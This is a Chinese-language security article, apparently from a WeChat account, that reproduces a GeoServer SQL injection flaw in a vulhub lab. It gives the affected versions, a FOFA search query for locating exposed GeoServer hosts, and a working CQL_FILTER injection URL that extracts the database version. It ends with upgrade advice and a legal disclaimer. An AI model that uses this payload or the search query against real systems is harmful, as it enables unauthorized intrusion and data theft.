> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XnawTQhH-pdVy4mg3EBjZQ)

**漏洞简介**

GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。在版本 2.22.1 和 2.21.4 及以前，多个 OGC 表达式中均存在 SQL 注入漏洞。  

**影响版本**

```
GeoServer < 2.21.4
2.22.0 <= GeoServer < 2.22.2

```

**FOFA 查询语句**

```
app="GeoServer" && country="CN"

```

**漏洞复现**

vulhub 靶场复现该漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVx8sfXAReK4DpWd1m7iabhXX9ebOvsqPTh5yRTN0WFWw1iaD5WJGia4pmAFvGKiauU5temtxMic3eow8fA/640?wx_fmt=png)

访问：http://your-ip:8080/geoserver 进入 Geoserver 首页

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVx8sfXAReK4DpWd1m7iabhXXjCt9sSPPXviaTHx2bGpFY0m0uyaxsIic3RUqDFWwDczf25NpPadrvcYw/640?wx_fmt=png)

在利用漏洞前，需要目标服务器中存在类型是 PostGIS 的数据空间（datastore）和工作空间（workspace）。在 Vulhub 中，已经包含满足条件的工作空间，其信息如下：

*   Workspace name: vulhub
    
*   Data store name: pg
    
*   Feature type (table) name: example
    
*   One of attribute from feature type: name
    

利用这些已知参数，发送如下 URL 即可触发 SQL 注入漏洞：

```
http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVx8sfXAReK4DpWd1m7iabhXX0az5v5swMADGMAm7CDaqyUjReaXWTn3nsYOqmlAhCicGSYOuicXmHRNw/640?wx_fmt=png)

成功注入获取版本信息  

**修复建议**

官方已发布新版本修复了该漏洞，可下载最新版本进行升级。

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVx8sfXAReK4DpWd1m7iabhXXbtibW76vK4s9QkCkmHs9CvXRtaTCyFEiaWticXp0JAMaXXdNmoLfKIDDA/640?wx_fmt=jpeg)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**